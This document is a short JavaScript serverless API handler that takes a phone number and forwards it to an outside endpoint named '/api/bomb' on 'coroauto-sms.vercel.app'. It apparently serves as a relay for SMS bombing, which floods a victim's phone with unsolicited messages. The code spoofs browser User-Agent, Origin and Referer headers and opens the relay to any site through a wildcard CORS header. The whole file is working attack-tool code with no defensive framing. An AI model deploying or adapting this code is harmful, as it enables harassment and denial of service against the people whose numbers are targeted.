export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ error: "POST only" });
  const body = req.body || {};
  const number = String(body.number || "").replace(/\D/g, "").slice(-10);
  if (number.length < 10) return res.status(400).json({ error: "bad number" });

  const payload = { number, mobile: number, phone: number, num: number };
  try {
    const r = await fetch("https://coroauto-sms.vercel.app/api/bomb", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        "Accept": "application/json",
        "Origin": "https://coroauto-sms.vercel.app",
        "Referer": "https://coroauto-sms.vercel.app/"
      },
      body: JSON.stringify(payload)
    });
    const text = await r.text();
    res.setHeader("Content-Type", "application/json");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Cache-Control", "no-store");
    return res.status(r.status).send(text);
  } catch (e) {
    return res.status(502).json({ error: String(e.message || e) });
  }
}
